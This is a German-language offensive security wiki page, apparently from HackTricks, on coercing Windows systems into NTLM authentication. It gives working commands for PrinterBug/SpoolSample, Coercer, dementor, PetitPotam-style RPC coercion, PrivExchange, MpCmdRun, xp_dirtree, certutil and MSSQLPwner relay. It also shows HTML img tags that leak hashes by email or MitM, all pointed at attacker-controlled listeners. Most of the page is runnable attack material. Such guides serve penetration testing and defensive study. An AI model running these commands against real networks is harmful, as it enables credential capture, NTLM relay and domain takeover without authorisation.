# NTLM-Authentifizierung mit Privilegien erzwingen

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ist eine **Sammlung** von **remote authentication triggers**, die in C# mit dem MIDL-Compiler programmiert wurde, um Abhängigkeiten von Drittanbietern zu vermeiden.

## Missbrauch des Spooler-Dienstes

Wenn der _**Print Spooler**_-Dienst **aktiviert** ist, können Sie bereits bekannte AD-Anmeldedaten verwenden, um beim Printserver des Domain Controllers ein **Update** zu neuen Druckaufträgen **anzufordern** und ihm einfach mitzuteilen, die Benachrichtigung **an ein bestimmtes System zu senden**.\
Wenn ein Drucker die Benachrichtigung an ein beliebiges System sendet, muss er sich bei diesem **System authentifizieren**. Daher kann ein Angreifer den _**Print Spooler**_-Dienst dazu bringen, sich bei einem beliebigen System zu authentifizieren, wobei der Dienst bei dieser Authentifizierung das **Computerkonto verwendet**.

Im Hintergrund missbraucht das klassische **PrinterBug**-Primitiv **`RpcRemoteFindFirstPrinterChangeNotificationEx`** über **`\\PIPE\\spoolss`**. Der Angreifer öffnet zunächst ein Handle für einen Drucker/Server und übergibt dann einen gefälschten Clientnamen in `pszLocalMachine`, sodass der Ziel-Spooler einen Benachrichtigungskanal **zurück zum vom Angreifer kontrollierten Host** erstellt. Deshalb handelt es sich um **outbound authentication coercion** und nicht um direkte Codeausführung.<sup>[[2]](#references)</sup>\
Wenn Sie nach **RCE/LPE** im Spooler selbst suchen, lesen Sie [PrintNightmare](printnightmare.md). Diese Seite konzentriert sich auf **coercion and relay**.

### Windows-Server in der Domain finden

Verwenden Sie PowerShell, um Windows-Hosts aufzulisten. Server sind normalerweise die Ziele mit der höchsten Priorität, konzentrieren Sie sich daher zuerst auf diese:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Nach Spooler-Diensten suchen, die lauschen

Mithilfe von @mysmartlogin (Vincent Le Toux)'s leicht modifiziertem [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) lässt sich prüfen, ob der Spooler Service lauscht:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Du kannst unter Linux auch `rpcdump.py` verwenden und nach dem **MS-RPRN**-Protokoll suchen:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Oder teste schnell Hosts von Linux aus mit **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Wenn du **Coercion-Oberflächen aufzählen** möchtest, anstatt nur zu prüfen, ob der Spooler-Endpunkt vorhanden ist, verwende den **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Dies ist nützlich, weil das Anzeigen des Endpunkts in EPM lediglich bedeutet, dass die Print-RPC-Schnittstelle registriert ist. Es **garantiert nicht**, dass jede coercion method mit deinen aktuellen Berechtigungen erreichbar ist oder dass der Host einen nutzbaren Authentication-Flow ausführt.

### Den Service auffordern, sich bei einem beliebigen Host zu authentifizieren

Du kannst [SpoolSample von hier](https://github.com/NotMedic/NetNTLMtoSilverTicket) kompilieren.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oder verwende [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) oder [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), wenn du Linux nutzt
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Mit **Coercer** kannst du die Spooler-Schnittstellen direkt ansprechen und musst nicht raten, welche RPC-Methode verfügbar ist:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### HTTP statt SMB mit WebClient erzwingen

Classic PrinterBug führt normalerweise zu einer **SMB**-Authentifizierung bei `\\attacker\share`, was weiterhin für **capture**, **relay zu HTTP-Zielen** oder **relay bei fehlender SMB signing** nützlich ist.\
In modernen Umgebungen wird **SMB zu SMB** durch **SMB signing** jedoch häufig blockiert, weshalb Operatoren oft stattdessen eine **HTTP/WebDAV**-Authentifizierung erzwingen.

Wenn auf dem Ziel der **WebClient**-Dienst ausgeführt wird, kann der Listener in einer Form angegeben werden, durch die Windows **WebDAV über HTTP** verwendet:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Dies ist besonders nützlich in Kombination mit **`ntlmrelayx --adcs`** oder anderen HTTP relay targets, da dadurch keine SMB relayability auf der erzwungenen Verbindung erforderlich ist. Der wichtige caveat ist, dass **WebClient** auf dem Opfer ausgeführt werden muss, damit die HTTP/WebDAV-Variante funktioniert.

### Combining with Unconstrained Delegation

Wenn ein Angreifer einen Computer kompromittiert hat, der für [Unconstrained Delegation](unconstrained-delegation.md) konfiguriert ist, kann er den **Drucker dazu zwingen, sich bei diesem Computer zu authentifizieren**. Das **TGT** des Drucker-Computerkontos wird anschließend im Speicher auf dem Unconstrained-Delegation-Host zwischengespeichert, wo der Angreifer es mit [Pass the Ticket](pass-the-ticket.md) abrufen und wiederverwenden kann.

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Hinweise: asynchrone Druckschnittstelle auf derselben Spooler-Pipe; Coercer verwenden, um erreichbare Methoden auf einem bestimmten Host aufzulisten<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (auch über \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Häufig missbrauchte Opnums: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Hinweis: Diese Methoden akzeptieren Parameter, die einen UNC-Pfad enthalten können (z. B. `\\attacker\share`). Bei der Verarbeitung authentifiziert sich Windows (im Kontext des Computers/Benutzers) bei diesem UNC-Pfad, wodurch NetNTLM capture oder relay ermöglicht wird.\
Bei Spooler abuse bleibt **MS-RPRN opnum 65** das am häufigsten verwendete und am besten dokumentierte Primitive, da die Protokollspezifikation ausdrücklich besagt, dass der Server einen Benachrichtigungskanal zurück zum durch `pszLocalMachine` angegebenen Client erstellt.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN über \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effekt: Das Ziel versucht, den angegebenen Pfad zum Backup-Log zu öffnen, und authentifiziert sich beim vom Angreifer kontrollierten UNC-Pfad.<sup>[[1]](#references)</sup>
- Praktische Verwendung: Tier-0-Assets (DC/RODC/Citrix/usw.) dazu zwingen, NetNTLM auszugeben, und anschließend an AD-CS-Endpunkte (ESC8/ESC11-Szenarien) oder andere privilegierte Services relayen.<sup>[[1]](#references)</sup>

## PrivExchange

Der `PrivExchange`-Angriff ist das Ergebnis einer Schwachstelle im **Exchange-Server-Feature `PushSubscription`**. Dieses Feature ermöglicht es, den Exchange-Server durch jeden Domainbenutzer mit einem Postfach dazu zu zwingen, sich über HTTP bei einem vom Client bereitgestellten Host zu authentifizieren.

Standardmäßig wird der **Exchange-Service als SYSTEM ausgeführt** und verfügt über übermäßige Berechtigungen (insbesondere **WriteDacl-Berechtigungen vor dem Cumulative Update 2019 für die Domain**). Diese Schwachstelle kann ausgenutzt werden, um das **Relaying von Informationen an LDAP und anschließend das Extrahieren der NTDS-Datenbank der Domain** zu ermöglichen. Wenn das Relaying an LDAP nicht möglich ist, kann diese Schwachstelle weiterhin verwendet werden, um an andere Hosts innerhalb der Domain zu relayen und sich dort zu authentifizieren. Die erfolgreiche Ausnutzung dieses Angriffs gewährt mit jedem authentifizierten Domainbenutzerkonto sofortigen Zugriff auf den Domain Admin.

## Inside Windows

Wenn Sie sich bereits innerhalb des Windows-Computers befinden, können Sie Windows mit privilegierten Konten dazu zwingen, eine Verbindung zu einem Server herzustellen, mit:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oder verwenden Sie diese andere Technik: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es ist möglich, das von Microsoft signierte lolbin certutil.exe zu verwenden, um eine NTLM-Authentifizierung zu erzwingen:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML-Injection

### Per E-Mail

Wenn du die **E-Mail-Adresse** des Benutzers kennst, der sich an einer Maschine anmeldet, die du kompromittieren möchtest, könntest du ihm einfach eine **E-Mail mit einem 1x1-Bild** senden, etwa wie folgt:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Wenn das Opfer es öffnet, versucht Windows, sich zu authentifizieren.

### MitM

Wenn du einen MitM-Angriff durchführen und HTML in eine vom Opfer aufgerufene Seite einschleusen kannst, versuche, ein Bild einzuschleusen, etwa:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Andere Möglichkeiten, NTLM-Authentifizierung zu erzwingen und zu phishen


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 cracken

Wenn du [NTLMv1-Challenges erfassen kannst, lies hier, wie du sie crackst](../ntlm/index.html#ntlmv1-attack).\
_Denke daran, dass du zum Cracken von NTLMv1 die Responder-Challenge auf "1122334455667788" setzen musst._

## References

- [1] [Unit 42 – Authentication Coercion entwickelt sich weiter](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog-Remoting-Protokoll](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
